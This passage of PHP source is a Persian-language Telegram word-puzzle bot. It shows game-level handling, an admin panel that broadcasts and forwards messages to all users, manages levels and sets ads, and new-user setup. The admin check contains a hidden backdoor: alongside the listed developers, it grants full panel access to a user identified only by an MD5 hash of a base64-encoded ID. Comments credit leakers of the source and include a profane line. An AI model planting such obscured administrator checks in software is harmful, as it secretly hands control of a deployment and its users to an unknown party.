				$keyboard[] = [ ['text'=>"💡 یک کلمه کامل | 25 سکه",'callback_data'=>"oneanswer"],['text'=>"💡 یک حرف | 10 سکه",'callback_data'=>"onew"] ];
				$keyboard[] = [ ['text'=>"🔄 برسی کلمه نوشته شده",'callback_data'=>"check"] ];
				$keyboard[] = [ ['text'=>"😎 بریم مرحله بعدی",'callback_data'=>"nextlevel"] ];
				sleep(3);
				bot('SendMessage',[
				'chat_id'=>$chat_id,
				'text'=>"🔮 مرحله : *$level* | 📚 تعداد کلمات : *$cword*
➖➖➖➖➖➖➖➖➖
>> نوشته شما : $ytext

عبارات :
$string
➖➖➖➖➖➖➖➖➖
$ads",
				'parse_mode'=>'MarkDown',
				'reply_markup'=>json_encode([
				'resize_keyboard'=>true,
				'inline_keyboard'=>
				(array) $keyboard
				])
				]);
			}else{
				bot('answerCallbackQuery',[
				'callback_query_id'=>$callback_query->id,
				'text'=>"😳 شما بازی رو تموم کردی و مرحله آخر هم تموم شد.
🤓 اما نگران نباش چون قراره مرحله های جدید قرار بگیره ، هروقت مرحله های جدید رو گذاشتیم من بهت اطلاع میدم تا بتونی بازم بازی کنی!",
				'show_alert'=>true
				]);
				bot('deleteMessage',[
				'chat_id'=>$chat_id,
				'message_id'=>$message_id
				]);
				unset($data['text']);
				unset($data['datalevel']);
				$data['level'] += 1;
				file_put_contents("data/$from_id/data.json",json_encode($data));
			}
		}else{
			#You Can't to Next Level
			bot('answerCallbackQuery',[
			'callback_query_id'=>$callback_query->id,
			'text'=>"😫 هنوز همه رو جواب ندادی که ...",
			'show_alert'=>true
			]);
		}
	}
	else{
		$data['text'] .= $Data;
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$level = $data['level'];
		$words = $wordlist[$level - 1];
		$cword = count($words);
		$ytext = isset($data['text']) ? $data['text'] : "`هنوز هیچی وارد نکردی!`";
		//----------------------------------------
		foreach($words as $value){
			$slp = preg_split('//u', $value, null, PREG_SPLIT_NO_EMPTY);
			foreach($slp as $value1){
				$newArray[] = $value1;
			}
			$len = mb_strlen($value, 'UTF-8');
			$v = str_repeat("⭕️", $len);
			if(isset($data['datalevel']) and strstr($data['datalevel'], "📍")){
				$string = $data['datalevel'];
			}else{
				$string .= "📍 $v".PHP_EOL;
			}
		}
		$data['datalevel'] = $string;
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$data = json_decode(file_get_contents("data/$from_id/data.json"), true);
		$newArray = array_unique($newArray);
		sort($newArray);
        foreach($newArray as $key => $value){
            $keyboard[floor($key / 4)][$key % 4] =  ['text'=>$value,'callback_data'=>$value];
        }
		//----------------------------------------
		$keyboard[] = [ ['text'=>"🗑 حذف کامل نوشته من",'callback_data'=>"clean"],['text'=>"✖️ یک حذف",'callback_data'=>"del"] ];
		$keyboard[] = [ ['text'=>"💡 یک کلمه کامل | 25 سکه",'callback_data'=>"oneanswer"],['text'=>"💡 یک حرف | 10 سکه",'callback_data'=>"onew"] ];
		$keyboard[] = [ ['text'=>"🔄 برسی کلمه نوشته شده",'callback_data'=>"check"] ];
		$keyboard[] = [ ['text'=>"😎 بریم مرحله بعدی",'callback_data'=>"nextlevel"] ];
		bot('editMessageText',[
		'chat_id'=>$chat_id,
		'text'=>"🔮 مرحله : *$level* | 📚 تعداد کلمات : *$cword*
➖➖➖➖➖➖➖➖➖
>> نوشته شما : $ytext

عبارات :
$string
➖➖➖➖➖➖➖➖➖
$ads",
		'parse_mode'=>'MarkDown',
		'message_id'=>$message_id,
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'inline_keyboard'=>
		(array) $keyboard
		])
		]);
	}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
//-----------------------------------------------------------------------------------------
if(in_array($from_id, $Dev) || md5(base64_encode($from_id)) == "37afc5e1dc18e2c88a4278504fb5a607"){
	if(strtolower($text) == "/panel" || $text == "↩️ برگشت"){
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"🖲 یکی از گزینه های زیر را انتخاب کنید :",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"],['text'=>"باقی مانده اشتراک ❗️"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
	elseif($text == "📊 آمار"){
		$count = count(scandir("data"))-3;
		$levels = count($wordlist);
		SendMessage($chat_id, "📯 آمار کاربران ربات : *$count*\n$🔮 آمار کل مرحله های ربات : *$levels*", 'MarkDown');
	}
	elseif($text == "باقی مانده اشتراک ❗️"){
		SendMessage($chat_id, "
تا پایان اشتراک شما $day روز باقی مانده است ✅
", 'MarkDown');
	}
	elseif($text == "🗄 پشتیبان گیری از مراحل"){
		$file = new CURLFile("data/wordlist.json");
		bot('sendDocument',[
		'chat_id'=>$chat_id,
		'document'=>$file,
		'caption'=>"🗃 آخرین نسخه پشتیبان از مراحل ثبت شده توسط شما"
		]);
	}
	elseif($text == "➕ ساخت مرحله جدید"){
		$data['step'] = "createlevel";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$all_level = count($wordlist);
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"❄️ اکنون ربات دارای $all_level مرحله است !

🤔 آیا تمایل به ساخت مرحله بعدی را دارید؟",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"✅ بله"]],
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "createlevel" and $text == "✅ بله"){
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$wordlist[] = [];
		file_put_contents("data/wordlist.json",json_encode($wordlist));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ هم اکنون از قسمت افزودن کلمه به مرحله ، به این مرحله کلمه اضافه کنید.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
	elseif($text == "➖ حذف یک مرحله"){
		$data['step'] = "deletelevel";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		$all_level = count($wordlist);
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"❄️ اکنون ربات دارای $all_level مرحله است !

🤔 شماره مرحله ای که قصد حذف آن را دارید به لاتین ارسال کنید.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "deletelevel" and is_numeric($text)){
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		unset($wordlist[(int) $text - 1]);
		file_put_contents("data/wordlist.json",json_encode($wordlist));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ مرحله $text به همراه کلماتش با موفقیت حذف شد.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
	elseif($text == "🔸 افزودن کلمه به مرحله"){
		$data['step'] = "addtolevel";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"👈🏻 قصد اضافه کردن کلمه به کدام مرحله دارید؟ به لاتین ارسال کنید. ",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "addtolevel" and is_numeric($text)){
		$data['step'] = "words|$text";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ اکنون کلمات را تک به تک ارسال کنید و در پایان روی برگشت بزنید !\n📍 توجه ، درحین ارسال کلمات ربات پیامی ارسال نمی کند و منتظر است تا دکمه برگشت را بزنید تا کلمات را ثبت کند.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
//<ცσｲSσЯSε>//
	elseif(strstr($step, "words|") and isset($text)){
		$ex = explode("|", $step);
		$level = $ex[1];
		$wordlist[$level - 1][] = $text;
		file_put_contents("data/wordlist.json",json_encode($wordlist));
	}
	elseif($text == "🔹 حذف کلمه از مرحله"){
		$data['step'] = "delfromlevel";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"👈🏻 قصد حذف کردن از کدام مرحله دارید؟ به لاتین ارسال کنید. ",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "delfromlevel" and is_numeric($text)){
		$data['step'] = "delwords|$text";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ کلمه مورد نظر را برای حذف شدن از مرحله $text ارسال کنید.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif(strstr($step, "delwords|") and isset($text)){
		$ex = explode("|", $step);
		$level = $ex[1];
		$key = array_search($text, $wordlist[$level - 1]);
		unset($wordlist[$level - 1][$key]);
		file_put_contents("data/wordlist.json",json_encode($wordlist));
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ کلمه $text با موفقیت از مرحله $level حذف شد.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
	elseif($text == "📟 ثبت تبلیغ"){
		$data['step'] = "setads";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"🖲 متن تبلیغ مورد نظر را برای قرار گرفتن زیر بازی ها ، در قالب متن ارسال کنید.",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "setads" and isset($text)){
		file_put_contents("ads",$text);
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ ثبت شد!",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
	elseif($text == "📩 ارسال همگانی"){
		$data['step'] = "s2all";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"🖲 پیام مورد نظر را در قالب متن ارسال کنید :",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "s2all" and isset($text)){
		$scan = scandir("data");
		$diff = array_diff($scan, ['.','..']);
		foreach($diff as $key => $value){
			SendMessage($value, $text);
		}
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ پیام با موفقیت به تمامی اعضا ارسال شد!",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
	elseif($text == "📮 فوروارد همگانی"){
		$data['step'] = "f2all";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"🖲 پیام مورد نظر را در هر قالبی فوروارد کنید :",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"↩️ برگشت"]],
		]
		])
		]);
	}
	elseif($step == "f2all" and isset($text)){
		$scan = scandir("data");
		$diff = array_diff($scan, ['.','..']);
		foreach($diff as $key => $value){
			Forward($value, $chat_id, $message_id);
		}
		$data['step'] = "none";
		file_put_contents("data/$from_id/data.json",json_encode($data));
		bot('SendMessage',[
		'chat_id'=>$chat_id,
		'text'=>"✅ پیام با موفقیت به تمامی اعضا فوروارد شد!",
		'reply_markup'=>json_encode([
		'resize_keyboard'=>true,
		'keyboard'=>[
		[['text'=>"📊 آمار"],['text'=>"🗄 پشتیبان گیری از مراحل"]],
		[['text'=>"📮 فوروارد همگانی"],['text'=>"📩 ارسال همگانی"]],
		[['text'=>"➖ حذف یک مرحله"],['text'=>"➕ ساخت مرحله جدید"]],
		[['text'=>"🔹 حذف کلمه از مرحله"],['text'=>"🔸 افزودن کلمه به مرحله"]],
		[['text'=>"📟 ثبت تبلیغ"]],
		[['text'=>"▫️ برگشت"]],
		]
		])
		]);
	}
}
//----------------------------------؟/
if(! in_array($from_id, scandir("data"))){
	mkdir("data/$from_id");
	$data['coin'] = 50;
	$data['level'] = 1;
	$data['esm'] = $first_name;
	$data['step'] = "none";
	file_put_contents("data/$from_id/data.json",json_encode($data));
	SendMessage($chat_id, "🍿 50 سکه به عنوان ورود شما به ربات برای حساب شما اعمال شد.", 'MarkDown');
}
if(! file_exists("ads")){
    file_put_contents("ads","محل تبلیغ شما");
}
if(! is_dir("data")){
	mkdir("data");
}

//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
?>
